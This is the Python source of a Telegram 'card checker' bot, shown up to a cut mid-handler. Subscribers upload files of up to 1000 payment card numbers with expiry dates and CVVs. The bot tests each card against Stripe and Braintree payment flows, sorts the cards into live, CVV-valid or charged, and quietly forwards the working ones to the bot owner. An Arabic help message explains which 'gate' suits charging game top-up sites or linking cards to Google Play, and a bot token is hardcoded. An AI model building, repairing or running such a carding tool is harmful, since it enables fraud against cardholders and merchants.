import requests,os
import telebot
from telebot import types
import datetime
import time
import random
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = hour + ':'+ mi +':' + ss + ' '+'0'+mm + '-' + dd + '-' + yyyy 
hours = now.hour
ran= ['45','56','34','12','66','67','90','89','44','65','32','97','58']
pr =random.choice(ran)

mesp = 'UID.txt'
myid = '5983253591'

try:
	open(mesp,'r').read()
except FileNotFoundError:
	open(mesp,'a').write(myid+'\n')

import re,json
import base64
import string
from datetime import datetime
from faker import Faker
import threading
stopuser = {}
token = "7690507664:AAEWkQWX0aJCz4nj9ViZNSDN_gB4Il5xg7I"
bot=telebot.TeleBot(token,parse_mode="HTML")
admin= 6413782426
myid = '5983253591'

#
def remove_year_prefix(combo_file):
    modified_lines = []
    with open(combo_file, 'r') as file:
        for line in file:
            parts = line.strip().split('|')
            if len(parts) >= 3:
                year = parts[2]
                if year.startswith('20'):
                    year = year[2:]
                parts[2] = year
                modified_line = '|'.join(parts)
                modified_lines.append(modified_line + '\n')
            else:
                modified_lines.append(line)
    with open(combo_file, 'w') as file:
        file.writelines(modified_lines)
#   /
f = Faker()
name = f.name()
street = f.address()
city = f.city()
state = f.state()
postal = f.zipcode()
phone = f.phone_number()
coun = f.country()
mail = f.email()
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
		
		

def dato(zh):

	try:
		api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
		brand=api_url["brand"]
		card_type=api_url["type"]
		level=api_url["level"]
		bank=api_url["bank"]
		country_name=api_url["country_name"]
		country_flag=api_url["country_flag"]
		mn = f'''- キ 𝘽𝙞𝙣 -» <code>{card_type} - {brand} - {level}</code>
- 朱 𝘽𝙖𝙣𝙠 -» <code>{bank}</code>
- 零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag}</code>'''
		return mn
	except Exception as e:
		print(e)
		return 'No info'
try:
	open('kilwa.txt','r').read()
except:
	open('kilwa.txt','a').write('')
@bot.message_handler(commands=["menu"])
def adodre(message):
	if str(message.chat.id) == myid:
		bot.reply_to(message,'''- Welcome My Boss Kilwa ♡
- Start Check Bot ¦ /start
- Add New Subscriber ¦ /add + ID
- Total Bot Users ¦ /tot
- Send Msg Forr All ¦ /kil + msg
- Delete A Subsc ¦ /dele + ID
- Show Sub's ID's ¦ /sh
------------------------------------
• Programmer ¦ @aaka8h
• Channel ¦ @skylegacyy''')
			
@bot.message_handler(commands=["start"])
def start(message):
	op = open(mesp,'r').read()
	if str(message.chat.id) in op:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="- Programmer ⚡", url="https://t.me/aaka8h")
		kilp = types.InlineKeyboardButton(text="- Channel ⚡", url="https://t.me/skylegacyy")
		keyboard.add(contact_button, kilp)
		try:
			open('image.jpg','rb')
		except:
			image_url = "http://m.gettywallpapers.com/wp-content/uploads/2023/09/Hunter-X-Hunter-Killua-Zoldyck-pfp.jpg"
			response = requests.get(image_url)
			with open("image.jpg", "wb") as f:
				f.write(response.content)
		im = open('image.jpg','rb')
		frs = bot.get_chat(message.chat.id).first_name
		bot.send_photo(message.chat.id,im,caption=f'''<strong>- 𝑾 𝑬 𝑳 𝑪 𝑶 𝑴 𝑬 • {frs} ⚡💫
	
• 𝑺𝑬𝑵𝑫 𝑴𝑬 𝑻𝑯𝑬 𝑪𝑶𝑴𝑩𝑶 𝑽𝑰𝑺𝑨 𝑭𝑰𝑳𝑬 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑰𝑻 ✨👑

• 𝙂𝘼𝙏𝙀𝙎 • 𝐕𝐈𝐏 👑 𝐆𝐀𝐓𝐄𝐒 💫

• 𝐌𝐀𝐗 𝐂𝐂 𝐋𝐈𝐌𝐈𝐓 𝐈𝐍 𝐂𝐎𝐌𝐁𝐎 -> 𝟏𝟎𝟎𝟎 𝐂𝐂 ✅📣

• 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 - @aaka8h</strong>''',reply_markup=keyboard)
	else:
		bot.reply_to(message,f'''- Welcome Dear ♡!
You are  Not Subscribed KilwaChk BOT !❌

Your ID -> <code>{message.chat.id}</code>
Programmer - @aaka8h''')
		UD = str(message.chat.id)
		frs = bot.get_chat(UD).first_name
		use = bot.get_chat(UD).username
		bot.send_message(myid,f'''- UnSubscribed User in BOT 👽❌

• ID -> <code>{message.chat.id}</code>
• Name User -> <code>{frs}</code> 
• User UserName -> @{use} ''')

@bot.message_handler(commands=["com"])
def start(message):
	op = open(mesp,'r').read()
	if str(message.chat.id) in op:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="- Programmer ⚡", url="https://t.me/aaka8h")
		kilp = types.InlineKeyboardButton(text="- Channel ⚡", url="https://t.me/skylegacyy")
		keyboard.add(contact_button, kilp)
		try:
			open('image.jpg','rb')
		except:
			image_url = "http://m.gettywallpapers.com/wp-content/uploads/2023/09/Hunter-X-Hunter-Killua-Zoldyck-pfp.jpg"
			response = requests.get(image_url)
			with open("image.jpg", "wb") as f:
				f.write(response.content)
		im = open('image.jpg','rb')
		frs = bot.get_chat(message.chat.id).first_name
		bot.send_photo(message.chat.id,im,caption=f'''<strong>- 𝑾 𝑬 𝑳 𝑪 𝑶 𝑴 𝑬 • {frs} ⚡💫
	
• 𝑺𝑬𝑵𝑫 𝑴𝑬 𝑻𝑯𝑬 𝑪𝑶𝑴𝑩𝑶 𝑽𝑰𝑺𝑨 𝑭𝑰𝑳𝑬 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑰𝑻 ✨👑

- Check One Visa - فحص فيزا وحدة -> /chk or .chk
- Ex • مثال -> .chk 5210220664956025|01|2028|307

• 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 - @aaka8h</strong>''',reply_markup=keyboard)
	else:
		bot.reply_to(message,f'''- Welcome Dear ♡!
You are  Not Subscribed KilwaChk BOT !❌

Your ID -> <code>{message.chat.id}</code>
Programmer - @aaka8h''')
		UD = str(message.chat.id)
		frs = bot.get_chat(UD).first_name
		use = bot.get_chat(UD).username
		bot.send_message(myid,f'''- UnSubscribed User in BOT 👽❌

• ID -> <code>{message.chat.id}</code>
• Name User -> <code>{frs}</code> 
• User UserName -> @{use} ''')
@bot.message_handler(content_types=["document"])
def main(message):
	if str(message.chat.id) == myid:
		keyboard = types.InlineKeyboardMarkup(row_width=1)
		sw = types.InlineKeyboardButton(text="- Stripe Charge ✅",callback_data='stripe')
		contact_buttonf = types.InlineKeyboardButton(text="- Stripe Auth ✅",callback_data='auth')
		kilp = types.InlineKeyboardButton(text="- Braintree Auth PRO ✅",callback_data='prob')
		contact_button = types.InlineKeyboardButton(text="- Braintree Auth ✅",callback_data='br')
		kil = types.InlineKeyboardButton(text="- Braintree Auth 2✅",callback_data='br2')
		
		keyboard.add(sw,contact_buttonf,kilp,contact_button,kil)
		bot.reply_to(message, text='• Choose The GateWay  🔍',reply_markup=keyboard)
	try:
		op = open(mesp,'r').read()
		if str(message.chat.id) in op:
			ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
			with open("combo.txt", "wb") as w:
				w.write(ee)
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				totalp = len(lino)
			if totalp > 1000:
				bot.reply_to(message,'''- 𝐁𝐀𝐃 𝐁𝐑𝐎 ❌

• 𝐓𝐇𝐄 𝐌𝐀𝐗 𝐂𝐂 𝐋𝐈𝐌𝐈𝐓 𝐈𝐒 𝟏𝟎𝟎𝟎 ✅

• 𝐂𝐇𝐄𝐂𝐊 𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄 𝐀𝐍𝐃 𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 📣''')
			else:
				keyboard = types.InlineKeyboardMarkup(row_width=1)
				sw = types.InlineKeyboardButton(text="- Stripe Charge ✅",callback_data='stripe')
				contact_buttonf = types.InlineKeyboardButton(text="- Stripe Auth ✅",callback_data='auth')
				kilp = types.InlineKeyboardButton(text="- Braintree Auth PRO ✅",callback_data='prob')
				contact_button = types.InlineKeyboardButton(text="- Braintree Auth ✅",callback_data='br')
				kil = types.InlineKeyboardButton(text="- Braintree Auth 2✅",callback_data='br2')
				kilm = types.InlineKeyboardButton(text="- شرح البوابات وعملهم",callback_data='ho')
				keyboard.add(sw,contact_buttonf,kilp,contact_button,kil,kilm)
				bot.reply_to(message, text='• Choose The GateWay  🔍',reply_markup=keyboard)
		else:
			bot.reply_to(message,f'''- Welcome Dear ♡!
You are  Not Subscribed KilwaChk BOT !❌

Your ID : {message.chat.id}
Programmer - @aaka8h''')
	except Exception as err:
		bot.reply_to(message,f'- Was An error : {err}')

@bot.callback_query_handler(func=lambda call: call.data == 'ho')
def menu_callbacrk(call):
	bot.send_message(chat_id=call.message.chat.id, text='''- شرح البوابات ✅⚡

1- بوابة سترايب تشارج (Stripe Charge ✅)
هذه البوابة تستخدم للمواقع اللي تحتاج شراء على الانترنت وتستخدم طريقة دفع سترايب(Stripe) 
لماذا اسمها سترايب تشارج؟ 
التشارج هو ان البوابة تحاول تسحب من الفيزا فلوس واذا الفيزا فيها فلوس البوت رح يرسلك لك اياها واذا مافيها فلوس البوت كمان رح يرسلك اياها واذا واقفة البوت اكيد مارح يرسلها 

مثل مواقع شحن العاب: 
- mtcgame.com , midasbuy.com

2- بوابة سترايب آوث(Stripe Auth ✅)
بوابة سترايب آوث تشبه بوابة سترايب تشارج ولكن الفرق: 
بوابة سترايب اوث ماتسحب من الفيزا فلوس تربطها ربط فقط يعني مايبين اذا الفيزا تشارج ولا لا 

3- بوابات برنتري آوث(Braintree Auth ✅) 
افضل بوابة للفحص الفيزات وربطها بجوجل
يعني بوابة برنتري اوث تربط الفيزا بالحساب ومايطلع اذا الفيزا تشارج ولا لأ ولكن ترسل لك الفيزات الشغالة ⚡📣

افضل بوابة لربط الفيزات بمتجر بلاي هي بوابة برنتري اوث(Braintree Auth) ✅

افضل بوابة للشحن على الانترنت هي سترايب تشارج(Stripe Charge) ✅''')
@bot.callback_query_handler(func=lambda call: call.data == 'stripe')
def menu_callback(call):
        dd = 0
        idm=call.from_user.id
        rs = 0
        rsk = 0
        cek = 0
        nop = 0
        live = 0
        ch = 0
        ko = (bot.send_message(idm,"Please Wait Status Processing...⌛").message_id)
        try:
                with open("combo.txt", 'r') as file:
                        lino = file.readlines()
                        total = len(lino)
                        try:
                                stopuser[f'{idm}']['status'] = 'start'
                        except:
                                stopuser[f'{idm}'] = {
                                'status': 'start'
                        }
                        for cc in lino:
                                if stopuser[f'{idm}']['status'] == 'stop':
                                        bot.send_message(chat_id=idm, text='• Done Stop Checking ✅')
                                        return
                                data = dato(cc[:6])
                                start_time = time.time()
                                try:
                                        last = str(StripeChargebot(cc))
                                except Exception as e:
                                        print(e)
                                        last=e
                                print(cc,'¦',last)
                                mes = types.InlineKeyboardMarkup(row_width=1)
                                cm1 = types.InlineKeyboardButton(f"-> {last}", callback_data='u8')
                                cm2 = types.InlineKeyboardButton(f"-> {cc}", callback_data='u8')
                                cm3 = types.InlineKeyboardButton(f"- Charged ✅ -> {ch} ", callback_data='x')
                                cm4 = types.InlineKeyboardButton(f"- Approved ✅ -> {live} ", callback_data='x')
                                cm7 = types.InlineKeyboardButton(f"- Cvv ✅ -> {rs} ", callback_data='x')
                                cm5 = types.InlineKeyboardButton(f"- Declined ❌ -> {dd} ", callback_data='x')
                                cm8 = types.InlineKeyboardButton(f"- Risk Wait ❌ -> {rsk} ", callback_data='x')
                                cm10 = types.InlineKeyboardButton(f"- Incorrect CC ❌ -> {nop} ", callback_data='x')
                                cm6 = types.InlineKeyboardButton(f"- All -> {total}/{cek}", callback_data='x')
                                stop=types.InlineKeyboardButton("- Stop Chk 📣", callback_data='stop')
                                mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6,stop)
                                bot.edit_message_text(chat_id=call.message.chat.id, message_id=ko, text='''Please Wait Checking Your Cards !.
Programeer - @aaka8h 🧸 ''', reply_markup=mes)
                                end_time = time.time()
                                execution_time = end_time - start_time
                                msg = f'''
<strong>- Hello Boss New Approved Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>'''
                                msgcvc= f'''
<strong>- Hello Boss New Cvv Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>'''
                                if 'Your card was declined.' in last:
                                        dd += 1
                                        cek+=1
                                        time.sleep(20)
                                elif 'Your card number is incorrect.' in last or 'Expired' in last or 'expired' in last:
                                        nop += 1
                                        cek+=1
                                        time.sleep(20)
                                elif 'error' in last:
                                        nop += 1
                                        cek+=1
                                        time.sleep(20)
                                elif "3D Required" in last:
                                        ch+=1
                                        cek+=1
                                        msg1= f'''
<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>'''
                                        if str(idm) == myid:
                                                bot.send_message(idm, msg1)
                                        else:
                                                bot.send_message(idm, msg1)
                                                bot.send_message(myid, msg1)
                                        time.sleep(20)
                                elif "Your card's security code is incorrect." in last:
                                        rs+=1
                                        cek+=1
                                        if str(idm) == myid:
                                                bot.send_message(idm, msgcvc)
                                        else:
                                                bot.send_message(idm, msgcvc)
                                                bot.send_message(myid, msg1)
                                        time.sleep(20)
                                elif 'Retry later : RISK' in last:
                                        rsk+=1
                                        cek+=1
                                        time.sleep(20)
                                elif 'Your card has insufficient funds.' in last:
                                        live+=1
                                        cek+=1
                                        if str(idm) == myid:
                                                bot.send_message(idm, msg)
                                        else:
                                                bot.send_message(idm, msg)
                                                bot.send_message(myid, msg)
                                        time.sleep(20)
                                else:
                                        ch += 1
                                        cek+=1
                                        msg1 = f'''
<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>'''
                                        if str(idm) == myid:
                                                bot.send_message(idm, msg1)
                                        else:
                                                bot.send_message(idm, msg1)
                                                bot.send_message(myid, msg1)
                                        time.sleep(20)
        except Exception as eo:
                print(eo)
@bot.callback_query_handler(func=lambda call: call.data == 'auth')
def maine(call):
        idm=call.from_user.id
        dd = 0
        live = 0
        ch = 0
        ko = (bot.send_message(idm,"Please Wait Status Processing...⌛").message_id)
        try:
                with open("combo.txt", 'r') as file:
                        lino = file.readlines()
                        total = len(lino)
                        try:
                                stopuser[f'{idm}']['status'] = 'start'
                        except:
                                stopuser[f'{idm}'] = {
                                'status': 'start'
                        }
                        for cc in lino:
                                if stopuser[f'{idm}']['status'] == 'stop':
                                        bot.send_message(chat_id=idm, text='• Done Stop Checking ✅')
                                        return
                                data = dato(cc[:6])
                                start_time = time.time()
                                try:
                                        last = str(Telest(cc))
                                except Exception as e:
                                        print(e)
                                mes = types.InlineKeyboardMarkup(row_width=1)
                                cm1 = types.InlineKeyboardButton(f"- {last}", callback_data='u8')
                                cm2 = types.InlineKeyboardButton(f"{cc}", callback_data='u8')
                                cm3 = types.InlineKeyboardButton(f"- Charged ✅ -> {ch} ", callback_data='x')
                                cm4 = types.InlineKeyboardButton(f"- Approved ✅ -> {live} ", callback_data='x')
                                cm5 = types.InlineKeyboardButton(f"- Declined ❌ -> {dd} ", callback_data='x')
                                cm6 = types.InlineKeyboardButton(f"- Total -> {total} ", callback_data='x')
                                stop=types.InlineKeyboardButton(f"- Stop Chk 📣", callback_data='stop')
                                mes.add(cm2, cm1, cm3, cm4, cm5,cm6,stop)
                                bot.edit_message_text(chat_id=call.message.chat.id, message_id=ko, text='''Please Wait Checking Your Cards !.
Programeer - @aaka8h 🧸 ''', reply_markup=mes)
                                end_time = time.time()
                                execution_time = end_time - start_time
                                msg = f'''
<strong>- Hello Boss New Approved Card ✅
--------------------------------------------
- GateWay -> Stripe Auth ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>'''
                                msgcvc = f'''
<strong>- Hello Boss New Cvv Card ✅
--------------------------------------------
- GateWay -> Stripe Auth ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>'''
                                print(last)
                                if "Insufficient Funds" in last:
                                        if str(idm) == myid:
                                                bot.send_message(idm, msg)
                                        else:
                                                bot.send_message(idm, msg)
                                                bot.send_message(myid, msg)
                                        live += 1
                                elif "The card's security code is incorrect." in last:
                                        live += 1
                                        if str(idm) == myid:
                                                bot.send_message(idm, msgcvc)
                                        else:
                                                bot.send_message(idm, msgcvc)
                                                bot.send_message(myid, msgcvc)
                                elif "Payment method added." in last:
                                        ch += 1
                                        msg1,msg2 = f'''
<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Auth ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
<strong>{data}</strong>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} Seconds.  seconds </code>
--------------------------------------------
- Programmer • @aaka8h</strong>''',f'''<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Auth ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
tg://openmessage?user_id={idm}'''
                                        if str(idm) == myid:
                                                bot.send_message(idm, msg1)
                                        else:
                                                bot.send_message(idm, msg1)
                                                bot.send_message(myid, msg1)
                                else:
                                        dd += 1
        except Exception as e:
                print(e)
                
@bot.callback_query_handler(func=lambda call: call.data == 'prob')
def menu_callbactk(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth 4'
		dd = 0
		live = 0
		riskk = 0
		cm = 0
		ccnn = 0
		mes = types.InlineKeyboardMarkup(row_width=1)
		cm1 = types.InlineKeyboardButton("- [ CARD ]", callback_data='u8')
		status = types.InlineKeyboardButton(f"- Status & Message ", callback_data='u8')
		cm3 = types.InlineKeyboardButton("- Approved ✅-> Number ", callback_data='x')
		ccn = types.InlineKeyboardButton("- CVV & CCN✅-> Number ", callback_data='x')
		cm4 = types.InlineKeyboardButton("- Declined ❌-> Number ", callback_data='x')
		cm5 = types.InlineKeyboardButton("- Total ⚡-> Number ", callback_data='x')
		stop=types.InlineKeyboardButton("- For Stop Check 🔍", callback_data='stop')
		mes.add(cm1,status, cm3,ccn,cm4, cm5, stop)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..",reply_markup=mes)
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.send_message(chat_id=id, text='- Done Stop Check Cards 📣⚡')
						return
					start_time = time.time()
					try:
						last = str(procc(cc))
						cm+=1
					except Exception as e:
						print(e)
						last = "RISK: gateway_error"
					print(last)
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"- 𝘾𝘾 • {cc}", callback_data='u8')
					status = types.InlineKeyboardButton(f"- 𝙎𝙩𝙖𝙩𝙪𝙨 • {last}", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"- 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 !✅ • {live}", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"- 𝗗𝗘𝗖𝗜i𝗡𝗘𝗗 !❌ • {dd}", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• {total} / {cm} •", callback_data='x')
					stop=types.InlineKeyboardButton("- Stop Check 🚷", callback_data='stop')
					mes.add(cm1,status, cm3,cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, text='''
<b>- Please Wait Checking Your Cards 💫
- Gate -> Braintree Auth PRO 💫
- Programmer -> @aaka8h </b>''', reply_markup=mes)
					msg=f'''<b>• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 !✅

- ア 𝘾𝘾 -> <code>{cc}</code>
- カ 𝙎𝙩𝙖𝙩𝙪𝙨 -> {last}
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -> ʙʀᴀɪɴᴛʀᴇᴇ ᴀᴜᴛʜ 4
{str(dato(cc[:6]))}

- 𝚃𝙸𝙼𝙴 -> {"{:.1f}".format(execution_time)} Seconds. 
- ʙᴏᴛ ʙʏ • @aaka8h</b>'''
					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last or 'CVV' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					else:
						dd += 1
					time.sleep(20)
		except Exception as eror:
			bot.send_message(admin,f'Eror -> {eror}')
		stopuser[f'{id}']['status'] = 'start'
		bot.send_message(chat_id=call.message.chat.id, text='- Done Check All Cards ✅\n - Programmer • @aaka8h')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	
@bot.callback_query_handler(func=lambda call: call.data == 'br2')
def menu_callbactk(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.send_message(chat_id=id, text='- Done Stop Check Cards 📣⚡')
						return
					start_time = time.time()
					try:
						last = str(bravo(cc))
					except Exception as e:
						print(e)
						last = "RISK: gateway_error"
					print(last)
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"- {cc}", callback_data='u8')
					status = types.InlineKeyboardButton(f"- {last}", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"- Approved ✅-> {live}", callback_data='x')
					ccn = types.InlineKeyboardButton(f"- Cvv ✅-> {ccnn} ", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"- Declined ❌-> {dd}", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"- Total ⚡-> {total}", callback_data='x')
					stop=types.InlineKeyboardButton("- Stop Check 🔍", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, text='''
<b>- Please Wait Checking Your Cards 💫
- Gate -> Braintree Auth 2
- Programmer -> @aaka8h </b>''', reply_markup=mes)
					msg=f'''<b>• Approved Card ✅
--------------------------------------------
- Card -> <code>{cc}</code>
- Message -> {last}
- GateWay -> {gate}
--------------------------------------------
{str(dato(cc[:6]))}
- Process Time -> {"{:.1f}".format(execution_time)} Seconds. 
--------------------------------------------
- Programmer • @aaka8h</b>'''
					msgc=f'''<b>
• Cvv Card ☑️		
--------------------------------------------
- Card -> <code>{cc}</code>
- Message -> {last}
- GateWay -> {gate}
--------------------------------------------
{str(dato(cc[:6]))}
- Process Time -> {"{:.1f}".format(execution_time)} Seconds. 
--------------------------------------------
- Programmer • @aaka8h</b></b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'CVV' in last or 'CCN' in last:
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(20)
		except Exception as eror:
			bot.send_message(admin,f'Eror -> {eror}')
		stopuser[f'{id}']['status'] = 'start'
		bot.send_message(chat_id=call.message.chat.id, text='- Done Check All Cards ✅\n - Programmer • @aaka8h')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()

@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vhk(message):
	gate='Braintree Auth 3'
	op = open(mesp,'r').read()
	if str(message.chat.id) in op:
		cc = message.text.replace('.chk ','').replace('/chk ','')
		
		ko = bot.reply_to(message,'- Please Wait Checking Your Card ....').message_id
		start_time = time.time()
		try:
			last = str(procc(cc))
		except:
			last = 'Gateway Error ❌'
		end_time = time.time()
		execution_time = end_time - start_time
		dec,ok,cvc=f'''<b>• 𝗗𝗘𝗖𝗜i𝗡𝗘𝗗 !❌

- ア 𝘾𝘾 -> <code>{cc}</code>
- カ 𝙎𝙩𝙖𝙩𝙪𝙨 -> {last}
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -> ʙʀᴀɪɴᴛʀᴇᴇ ᴀᴜᴛʜ 4
{str(dato(cc[:6]))}

- 𝚃𝙸𝙼𝙴 -> {"{:.1f}".format(execution_time)} Seconds. 
- ʙᴏᴛ ʙʏ • @aaka8h</b>''',f'''<b>• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 !✅

- ア 𝘾𝘾 -> <code>{cc}</code>
- カ 𝙎𝙩𝙖𝙩𝙪𝙨 -> {last}
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -> ʙʀᴀɪɴᴛʀᴇᴇ ᴀᴜᴛʜ 4
{str(dato(cc[:6]))}

- 𝚃𝙸𝙼𝙴 -> {"{:.1f}".format(execution_time)} Seconds. 
- ʙᴏᴛ ʙʏ • @aaka8h</b>''',f'''<b>• Cvv Card ☑️		
--------------------------------------------
- Card -> <code>{cc}</code>
- Message -> {last}
- GateWay -> {gate}
--------------------------------------------
{str(dato(cc[:6]))}
- Process Time -> {"{:.1f}".format(execution_time)} Seconds. 
--------------------------------------------
- Programmer • @aaka8h</b>'''
		if 'CVV' in last or 'CCN' in last:
			bot.edit_message_text(text=cvc,chat_id=message.chat.id, message_id=ko)
		elif "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
			bot.edit_message_text(text=ok,chat_id=message.chat.id, message_id=ko)
		else:
			bot.edit_message_text(text=dec,chat_id=message.chat.id, message_id=ko)
	else:
		bot.reply_to(message,f'''- Welcome Dear ♡!
You are  Not Subscribed KilwaChk BOT !❌

Your ID : {message.chat.id}
Programmer - @aaka8h''')
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callbacke(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.send_message(chat_id=id, text='- Done Stop Check Cards 📣⚡')
						return
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "RISK: gateway_error"
					print(last)
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"- {cc}", callback_data='u8')
					status = types.InlineKeyboardButton(f"- {last}", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"- Approved ✅-> {live}", callback_data='x')
					ccn = types.InlineKeyboardButton(f"- Cvv ✅-> {ccnn} ", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"- Declined ❌-> {dd}", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"- Total ⚡-> {total}", callback_data='x')
					stop=types.InlineKeyboardButton("- Stop Check 🔍", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, text='''
<b>- Please Wait Checking Your Cards 💫
- Gate -> Braintree Auth 2
- Programmer -> @aaka8h </b>''', reply_markup=mes)
					msg=f'''<b>• Approved Card ✅
--------------------------------------------
- Card -> <code>{cc}</code>
- Message -> {last}
- GateWay -> {gate}
--------------------------------------------
{str(dato(cc[:6]))}
- Process Time -> {"{:.1f}".format(execution_time)} Seconds. 
